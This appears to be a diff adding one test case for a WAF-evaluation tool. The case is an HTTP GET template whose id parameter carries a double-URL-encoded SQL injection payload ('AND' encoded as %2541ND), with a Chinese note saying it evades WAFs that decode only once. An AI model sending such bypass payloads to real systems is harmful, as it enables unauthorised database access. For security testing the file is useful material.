@@ -1,0 +1,13 @@
+# @name: 双重URL编码
+# @tags: get,sqli,double-urlencode,id,bypass
+# @color: orange
+# @validate: baseline_similarity
+# @threshold: 0.90
+# @intent: keyword_double_url_encode
+# @intent.param: id
+# @intent.payload: id=1'+%2541ND+'a'='a
+# @note: 双重 URL 编码(%25=% → %41 → A)，绕过仅解码一次的 WAF，依赖后端二次解码场景(Apache/Nginx 反代 + Tomcat/PHP)。SQLMap chardoubleencode 思路。
+GET /?id=1'+%2541ND+'a'='a HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+
